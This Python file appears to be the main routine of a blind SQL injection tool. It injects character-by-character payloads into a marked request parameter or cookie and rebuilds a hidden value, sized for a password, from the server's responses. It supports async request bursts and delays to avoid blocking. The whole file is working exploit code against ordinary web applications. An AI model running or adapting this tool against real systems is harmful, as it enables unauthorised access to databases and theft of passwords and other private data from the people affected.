import code.utils as utils
import code.req as req
import asyncio
import time
import json
from html import escape


def process(URL: str, TYPE: str, METHOD: str, PAYLOAD: str) -> int:

    prepare_functions = {
        "async_mode":{
            "basic": lambda url, method, static, arr_data, SQLtype : asyncio.run(req.prepare_async_requests(url, method, static, arr_data, SQLtype)),
            "error": lambda url, method, static, arr_data, SQLtype : asyncio.run(req.prepare_async_requests(url, method, static, arr_data, SQLtype))
        },
        "sync_mode":{
            "basic": lambda url, method, static, arr_data, SQLtype : req.prepare_sync_requests(url, method, static, arr_data, SQLtype),
            "error": lambda url, method, static, arr_data, SQLtype : req.prepare_sync_requests(url, method, static, arr_data, SQLtype)
        }
    }

    def __init_request() -> utils.HTTP_Request:
        request = utils.HTTP_Request()
        if not utils.ARGS.input:
            print("[error] Not fixed yet => Give an input file.")
            exit(1)
            # request = utils.init_request(request)
        else:
            print("[info] Hello Sir. All the job was made for you. Enjoy your meal my lord.")
            with open(utils.ARGS.input, "r") as in_file:
                in_json = in_file.read()
                in_request = json.loads(in_json)
                request.params = in_request["params"]
                if "cookie" in in_request:
                    request.cookie = in_request["cookie"]
                    if "<>" in request.cookie:
                        request.SQLi = "cookie"
        return request

    request = __init_request()
    # Find which param is the sqli
    if request.SQLi == "params":
        sqli_key = ""
        for key, value in request.params.items():
            if "<>" in value:
                sqli_key = key
                break

    print("[info] If SCuLi is blocked during process: add some `--delay`.")
    utils.countdown()
    total_start = time.time()

    exfiltred_data = ""
    max_len_password = 32
    data = request.params.copy()
    mode = "async_mode" if utils.ARGS.speed else "sync_mode"
    for index in range(max_len_password):
        payload_1 = PAYLOAD.replace('<index>', str(index+1))
        arr_data = []

        for c in utils.ALPHABET:
            if request.SQLi == "params":
                data[sqli_key] = request.params[sqli_key].replace("<>", payload_1.replace('<char>', escape(c)))
                arr_data.append(data.copy())
            elif request.SQLi == "cookie":
                cookie = request.cookie.replace("<>", payload_1.replace("<char>", escape(c)))
                arr_data.append(cookie)

        if request.SQLi == "params":
            exfiltred = prepare_functions[mode][TYPE](URL, METHOD, utils.ARGS.cookie, arr_data, SQLtype="HTTP")
        if request.SQLi == "cookie":
            exfiltred = prepare_functions[mode][TYPE](URL, METHOD, request.params, arr_data, SQLtype="Cookie")

        if exfiltred:
            exfiltred_data += exfiltred
            print(f"[info] Char {index+1} found: `{exfiltred}` => `{exfiltred_data}`")
            if utils.ARGS.delay:
                time.sleep(float(utils.ARGS.delay))
        else:
            break
    utils.TIMING = round(time.time() - total_start, 2)
    return exfiltred_data


